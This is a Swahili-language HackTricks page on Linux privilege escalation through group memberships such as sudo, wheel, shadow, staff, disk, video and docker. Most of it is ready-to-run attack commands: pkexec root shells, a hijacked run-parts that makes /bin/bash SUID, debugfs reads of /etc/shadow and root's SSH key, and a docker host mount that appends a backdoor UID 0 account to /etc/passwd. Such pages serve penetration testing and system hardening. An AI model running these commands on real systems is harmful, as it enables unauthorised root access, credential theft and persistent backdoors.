# Vikundi Vinavyovutia - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**Wakati mwingine**, **kwa chaguo-msingi (au kwa sababu programu fulani inahitaji)** ndani ya faili **/etc/sudoers** unaweza kupata baadhi ya mistari ifuatayo:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii ina maana kwamba **mtumiaji yeyote ambaye ni sehemu ya kikundi sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hivyo, ili **kuwa root unaweza tu kutekeleza**:
```
sudo su
```
### PE - Mbinu 2

Tafuta binaries zote za suid na uhakikishe kama binary **Pkexec** ipo:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa utagundua kwamba binary **pkexec is a SUID binary** na wewe ni mwanachama wa **sudo** au **admin**, huenda ukaweza kutekeleza binaries kama sudo ukitumia `pkexec`.  
Hii ni kwa sababu kawaida hayo ndiyo makundi yaliyomo ndani ya **polkit policy**. Sera hii inaeleza ni makundi gani yanaweza kutumia `pkexec`. Angalia kwa:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utapata ni vikundi gani vinavyoruhusiwa kuendesha **pkexec** na **kwa chaguo-msingi** katika baadhi ya linux disctros vikundi **sudo** na **admin** huonekana.

Ili **kuwa root unaweza kuendesha**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ikiwa unajaribu kutekeleza **pkexec** na ukapata hili **kosa**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Sio kwa sababu huna ruhusa, bali kwa sababu hauunganishwi bila GUI**. Na kuna njia mbadala ya kutatua tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vikao viwili tofauti vya ssh**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Wakati mwingine**, **kwa chaguo-msingi** ndani ya faili **/etc/sudoers** unaweza kupata mstari huu:
```
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote aliye mwanachama wa kikundi wheel anaweza kutekeleza chochote kwa kutumia sudo**.

Ikiwa hivyo, ili **kuwa root unaweza tu kutekeleza**:
```
sudo su
```
## Shadow Group

Watumiaji kutoka kwa **group shadow** wanaweza **kusoma** faili **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Kwa hivyo, soma faili na ujaribu **crack some hashes**.

Tofauti fupi ya lock-state wakati wa triaging hashes:
- Vingizo vyenye `!` au `*` kwa ujumla haviruhusu maingiliano ya kuingia kwa kutumia nenosiri.
- `!hash` kwa kawaida ina maana kwamba nenosiri liliwekwa kisha kufungwa.
- `*` kwa kawaida ina maana hakuna hash halali ya nenosiri iliyowekwa.
Hii ni muhimu kwa upangaji wa akaunti hata wakati kuingia moja kwa moja kumezuiwa.

## Staff Group

**staff**: Inaruhusu watumiaji kuongeza mabadiliko ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za root (kumbuka kwamba executables katika `/usr/local/bin` ziko katika variable ya $PATH ya mtumiaji yeyote, na zinaweza "override" executables katika `/bin` na `/usr/bin` zenye jina sawa). Linganishwa na kundi "adm", ambalo linahusiana zaidi na ufuatiliaji/usalama. [\[source\]](https://wiki.debian.org/SystemGroups)

Katika distributions za debian, variable ya `$PATH` inaonyesha kwamba `/usr/local/` itaendeshwa kwa kipaumbele cha juu zaidi, iwe wewe ni mtumiaji mwenye ruhusa za juu au la.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ikiwa tunaweza hijack baadhi ya programu katika `/usr/local`, tunaweza kupata root kwa urahisi.

Hijack programu ya `run-parts` ni njia rahisi ya kupata root, kwa sababu programu nyingi zinaendesha `run-parts` (mfano crontab, wakati wa kuingia kwa ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
au wakati kikao kipya cha ssh kinapoingia.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Kundi la Diski

Haki hii karibu ni **sawa na root access** kwani unaweza kufikia data zote ndani ya mashine.

Mafaili:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Kumbuka kwamba kwa kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili kunakili `/tmp/asd1.txt` hadi `/tmp/asd2.txt` unaweza kufanya:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Walakini, ikiwa utajaribu **kuandika faili zinazomilikiwa na root** (like `/etc/shadow` or `/etc/passwd`) utapata kosa la "**Permission denied**".

## Video Group

Kutumia amri `w` unaweza kupata **ni nani aliyeingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** ina maana kwamba mtumiaji **yossi ameingia kimwili** kwenye terminal ya mashine.

Kundi la **video group** lina ufikiaji wa kuona pato la skrini. Kimsingi, unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** kama data ghafi na kupata azimio ambalo skrini inalitumia. Data ya skrini inaweza kuhifadhiwa kwenye `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ili **kufungua** **raw image** unaweza kutumia **GIMP**, chagua faili **`screen.raw`** na chagua kama aina ya faili **Raw image data**:

![](<../../../images/image (463).png>)

Kisha badilisha Width na Height kwa zile zilizotumika kwenye skrini na jaribu Image Types tofauti (na chagua ile inayoonyesha skrini vizuri zaidi):

![](<../../../images/image (317).png>)

## Root Group

Inaonekana kuwa kwa chaguo-msingi **members of root group** wanaweza kuwa na ufikiaji wa **modify** baadhi ya faili za usanidi za **service** au baadhi ya faili za **libraries** au **other interesting things** ambazo zinaweza kutumika kupandisha ruhusa...

**Angalia ni faili gani root members wanaweza modify**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Unaweza **mount the root filesystem of the host machine to an instance’s volume**, hivyo wakati instance inapoanza mara moja inapakia `chroot` ndani ya volume hiyo. Hii kwa ufanisi inakupa root kwenye mashine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Hatimaye, ikiwa hupendi mapendekezo yoyote ya hapo awali, au hayaendi kazi kwa sababu fulani (docker api firewall?), unaweza kila wakati kujaribu **run a privileged container and escape from it** kama ilivyoelezwa hapa:


{{#ref}}
../container-security/
{{#endref}}

Kama una ruhusa za kuandika juu ya docker socket soma [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

Kwa kawaida **wanachama** wa kundi **`adm`** wana ruhusa za **kusoma logi** faili zinazopatikana ndani ya _/var/log/_.\
Kwa hiyo, ikiwa umevamia mtumiaji ndani ya kundi hili, hakika unapaswa **kuangalia logi**.

## Backup / Operator / lp / Mail groups

Makundi haya mara nyingi ni njia za **credential-discovery** badala ya njia za moja kwa moja za kupata root:
- **backup**: inaweza kufichua arhivu zenye configs, keys, DB dumps, au tokens.
- **operator**: ufikiaji wa kiutendaji maalum wa platform ambao unaweza leak sensitive runtime data.
- **lp**: print queues/spools zinaweza kuwa na maudhui ya nyaraka.
- **mail**: mail spools zinaweza kufichua reset links, OTPs, na internal credentials.

Chukulia uanachama hapa kama ugunduzi wa kufichua data yenye thamani kubwa na pivot kupitia password/token reuse.

## Auth group

Ndani ya OpenBSD kundi la **auth** kawaida linaweza kuandika katika folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumiwa.\
Ruhusa hizi zinaweza kutumika vibaya kwa exploit ifuatayo ili **escalate privileges** kwa root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
